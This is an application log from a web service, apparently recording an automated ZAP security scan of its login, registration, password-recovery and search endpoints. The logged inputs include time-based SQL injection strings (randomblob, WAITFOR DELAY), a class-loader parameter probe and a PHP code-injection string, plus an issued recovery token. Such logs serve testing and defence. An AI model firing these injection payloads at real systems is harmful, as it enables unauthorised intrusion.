[2024-08-20 10:03:08,174] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/myprofile > [FUNC] [/MyProfile] [Succeess] User:<usr-1>
[2024-08-21 07:58:57,886] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=case+randomblob(1000000)+when+not+null+then+1+else+1+end+ > [AUTH] [passrec] [Failed] User:<case randomblob(1000000) when not null then 1 else 1 end > does not exist
[2024-08-21 07:58:57,907] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=case+randomblob(10000000)+when+not+null+then+1+else+1+end+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<case randomblob(10000000) when not null then 1 else 1 end >
[2024-08-21 07:58:57,910] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=case+randomblob(10000000)+when+not+null+then+1+else+1+end+ > [AUTH] [passrec] [Failed] User:<case randomblob(10000000) when not null then 1 else 1 end > does not exist
[2024-08-21 07:58:57,937] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=2tzjpb634e55dbq7qycm891y7qmohajfa87w57f71m0zzq57pow9mvktrl > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<2tzjpb634e55dbq7qycm891y7qmohajfa87w57f71m0zzq57pow9mvktrl>
[2024-08-21 07:58:57,940] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=c5aekeh49f8xalwkplf7ptaa6x12d77sxw3ksv29xxc2os7o1z9tfrcive > [AUTH] [passrec] [Failed] User:<c5aekeh49f8xalwkplf7ptaa6x12d77sxw3ksv29xxc2os7o1z9tfrcive> does not exist
[2024-08-21 07:58:57,958] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=case+randomblob(100000000)+when+not+null+then+1+else+1+end+ > [AUTH] [passrec] [Failed] User:<case randomblob(100000000) when not null then 1 else 1 end > does not exist
[2024-08-21 07:58:57,963] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=case+randomblob(100000000)+when+not+null+then+1+else+1+end+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<case randomblob(100000000) when not null then 1 else 1 end >
[2024-08-21 07:58:57,980] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=case+randomblob(1000000000)+when+not+null+then+1+else+1+end+ > [AUTH] [passrec] [Failed] User:<case randomblob(1000000000) when not null then 1 else 1 end > does not exist
[2024-08-21 07:58:57,987] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=case+randomblob(1000000000)+when+not+null+then+1+else+1+end+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<case randomblob(1000000000) when not null then 1 else 1 end >
[2024-08-21 07:58:58,232] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Succeess] User:<ZAP>, role: <0>
[2024-08-21 07:58:58,275] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<case randomblob(100000) when not null then 1 else 1 end >
[2024-08-21 07:58:58,732] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Succeess] User:<ZAP>, role: <0>
[2024-08-21 07:58:58,759] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<dou85w3d7iu9zi0epdgl90icyfbt5w2y00jj061g3evcxf8acfxajrzn>
[2024-08-21 07:58:59,222] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<case randomblob(1000000) when not null then 1 else 1 end >
[2024-08-21 07:58:59,281] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Succeess] User:<case randomblob(100000) when not null then 1 else 1 end >, role: <0>
[2024-08-21 07:58:59,663] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<case randomblob(10000000) when not null then 1 else 1 end >
[2024-08-21 07:58:59,733] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Succeess] User:<case randomblob(1000000) when not null then 1 else 1 end >, role: <0>
[2024-08-21 07:58:59,788] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<bq2dlm2ja1xpywuqf5bw55k7zoi2tf0aqk9ob1jgkwn9z27gqw7buoudp> Password:<ZAP>
[2024-08-21 07:59:00,102] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ivdis0mz6nh9uy4bse45rey353wnh0udf5fz7pbtxurat8qt5hfz5zb41f>
[2024-08-21 07:59:00,237] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Succeess] User:<case randomblob(10000000) when not null then 1 else 1 end >, role: <0>
[2024-08-21 07:59:00,287] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ycgcb6p2tqqzoump4gd9d9kb61g8hw8ne8dbeuj4qr7s7n491fknc20bhk> Password:<ZAP>
[2024-08-21 07:59:00,634] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<case randomblob(100000000) when not null then 1 else 1 end >
[2024-08-21 07:59:00,753] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Succeess] User:<ZAP>, role: <0>
[2024-08-21 07:59:01,081] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<83hf96e30p719csgxfwpohzc0lsq5nyte7bzi6sz1bu7ausr6g5nxeorq13>
[2024-08-21 07:59:01,168] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Succeess] User:<ZAP>, role: <0>
[2024-08-21 07:59:01,578] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<case randomblob(1000000000) when not null then 1 else 1 end >
[2024-08-21 07:59:01,613] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:01,666] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:01,698] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<case randomblob(100000) when not null then 1 else 1 end >
[2024-08-21 07:59:01,708] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:01,754] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:01,795] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:01,836] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:01,873] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:01,919] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:01,957] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:01,996] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:02,036] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:02,055] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:02,093] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:02,135] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<hz7jaqgxqqaoldr14ew3zif0wtulf16zg9d1np5u2hkft08s0ht9qntc>
[2024-08-21 07:59:02,137] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:02,185] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:02,221] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:02,257] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:02,295] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:02,336] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:02,600] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<case randomblob(1000000) when not null then 1 else 1 end >
[2024-08-21 07:59:03,029] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<case randomblob(10000000) when not null then 1 else 1 end >
[2024-08-21 07:59:03,463] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<case randomblob(100000000) when not null then 1 else 1 end >
[2024-08-21 07:59:03,922] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<case randomblob(1000000000) when not null then 1 else 1 end >
[2024-08-21 07:59:04,358] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<pknelmu0w2n5aptabfqxqf3fb3emibzcibx8zqpxo5uz1zshpwdu97sovss2>
[2024-08-21 07:59:06,354] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP WAITFOR DELAY '0:0:15' -- > Password:<ZAP>
[2024-08-21 07:59:06,378] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP' WAITFOR DELAY '0:0:15' -- > Password:<ZAP>
[2024-08-21 07:59:06,463] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP" WAITFOR DELAY '0:0:15' -- > Password:<ZAP>
[2024-08-21 07:59:06,529] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP+WAITFOR+DELAY+'0:0:15'+--+ > [AUTH] [passrec] [Failed] User:<ZAP WAITFOR DELAY '0:0:15' -- > does not exist
[2024-08-21 07:59:06,529] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP+WAITFOR+DELAY+'0:0:15'+--+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:06,536] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP) WAITFOR DELAY '0:0:15' -- > Password:<ZAP>
[2024-08-21 07:59:06,555] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP) ' WAITFOR DELAY '0:0:15' -- > Password:<ZAP>
[2024-08-21 07:59:06,556] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP'+WAITFOR+DELAY+'0:0:15'+--+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP' WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:06,558] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP'+WAITFOR+DELAY+'0:0:15'+--+ > [AUTH] [passrec] [Failed] User:<ZAP' WAITFOR DELAY '0:0:15' -- > does not exist
[2024-08-21 07:59:06,576] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP"+WAITFOR+DELAY+'0:0:15'+--+ > [AUTH] [passrec] [Failed] User:<ZAP" WAITFOR DELAY '0:0:15' -- > does not exist
[2024-08-21 07:59:06,576] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP) " WAITFOR DELAY '0:0:15' -- > Password:<ZAP>
[2024-08-21 07:59:06,581] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP"+WAITFOR+DELAY+'0:0:15'+--+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP" WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:06,593] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP)+WAITFOR+DELAY+'0:0:15'+--+ > [AUTH] [passrec] [Failed] User:<ZAP) WAITFOR DELAY '0:0:15' -- > does not exist
[2024-08-21 07:59:06,596] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP)) WAITFOR DELAY '0:0:15' -- > Password:<ZAP>
[2024-08-21 07:59:06,602] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP)+WAITFOR+DELAY+'0:0:15'+--+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP) WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:06,612] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP)+'+WAITFOR+DELAY+'0:0:15'+--+ > [AUTH] [passrec] [Failed] User:<ZAP) ' WAITFOR DELAY '0:0:15' -- > does not exist
[2024-08-21 07:59:06,614] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP)) ' WAITFOR DELAY '0:0:15' -- > Password:<ZAP>
[2024-08-21 07:59:06,624] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP)+'+WAITFOR+DELAY+'0:0:15'+--+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP) ' WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:06,630] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP)+"+WAITFOR+DELAY+'0:0:15'+--+ > [AUTH] [passrec] [Failed] User:<ZAP) " WAITFOR DELAY '0:0:15' -- > does not exist
[2024-08-21 07:59:06,630] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP)) " WAITFOR DELAY '0:0:15' -- > Password:<ZAP>
[2024-08-21 07:59:06,643] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP)+"+WAITFOR+DELAY+'0:0:15'+--+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP) " WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:06,646] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP) WAITFOR DELAY '0:0:15' (> Password:<ZAP>
[2024-08-21 07:59:06,647] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP))+WAITFOR+DELAY+'0:0:15'+--+ > [AUTH] [passrec] [Failed] User:<ZAP)) WAITFOR DELAY '0:0:15' -- > does not exist
[2024-08-21 07:59:06,662] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP))+WAITFOR+DELAY+'0:0:15'+--+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP)) WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:06,667] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP))+'+WAITFOR+DELAY+'0:0:15'+--+ > [AUTH] [passrec] [Failed] User:<ZAP)) ' WAITFOR DELAY '0:0:15' -- > does not exist
[2024-08-21 07:59:06,685] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP))+'+WAITFOR+DELAY+'0:0:15'+--+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP)) ' WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:06,689] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP))+"+WAITFOR+DELAY+'0:0:15'+--+ > [AUTH] [passrec] [Failed] User:<ZAP)) " WAITFOR DELAY '0:0:15' -- > does not exist
[2024-08-21 07:59:06,706] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP))+"+WAITFOR+DELAY+'0:0:15'+--+ > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP)) " WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:06,710] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP)+WAITFOR+DELAY+'0:0:15'+( > [AUTH] [passrec] [Failed] User:<ZAP) WAITFOR DELAY '0:0:15' (> does not exist
[2024-08-21 07:59:06,731] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP)+WAITFOR+DELAY+'0:0:15'+( > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP) WAITFOR DELAY '0:0:15' (>
[2024-08-21 07:59:06,745] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ZAP WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:07,056] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<ZAP WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:07,194] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ZAP' WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:07,513] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<ZAP' WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:07,634] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ZAP" WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:07,964] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<ZAP" WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:08,071] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ZAP) WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:08,381] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<ZAP) WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:08,489] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ZAP) ' WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:08,800] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<ZAP) ' WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:08,921] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ZAP) " WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:09,244] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<ZAP) " WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:09,417] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ZAP)) WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:09,712] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<ZAP)) WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:09,917] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ZAP)) ' WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:10,209] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<ZAP)) ' WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:10,413] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ZAP)) " WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:10,712] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<ZAP)) " WAITFOR DELAY '0:0:15' -- >
[2024-08-21 07:59:10,842] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<ZAP) WAITFOR DELAY '0:0:15' (>
[2024-08-21 07:59:10,860] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:10,879] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:10,898] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:10,925] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:10,942] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:10,959] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:10,986] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,006] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,044] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,064] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,084] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,102] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,113] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<ZAP) WAITFOR DELAY '0:0:15' (>
[2024-08-21 07:59:11,120] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,140] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,177] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,197] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,215] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,233] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,254] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,276] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,315] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP&class.module.classLoader.DefaultAssertionStatus=nonsense > [AUTH] [passrec] [Succeess] For User:<ZAP> token <eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwibG9naW4iOiJaQVAifQ.k1Q3eFYqa7iFSepklnVBtORKMt1u6YAvtF8ewK7JHRE> created
[2024-08-21 07:59:11,320] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=ZAP&class.module.classLoader.DefaultAssertionStatus=nonsense > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<ZAP>
[2024-08-21 07:59:11,336] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:11,346] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=ZAP > [AUTH] [passrec] [Succeess] For User:<ZAP> token <eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwibG9naW4iOiJaQVAifQ.k1Q3eFYqa7iFSepklnVBtORKMt1u6YAvtF8ewK7JHRE> created
[2024-08-21 07:59:11,727] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Succeess] User:<ZAP>, role: <0>
[2024-08-21 07:59:11,782] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var="> Password:<ZAP>
[2024-08-21 07:59:11,787] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var%3D" > [AUTH] [passrec] [Failed] User:<";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var="> does not exist
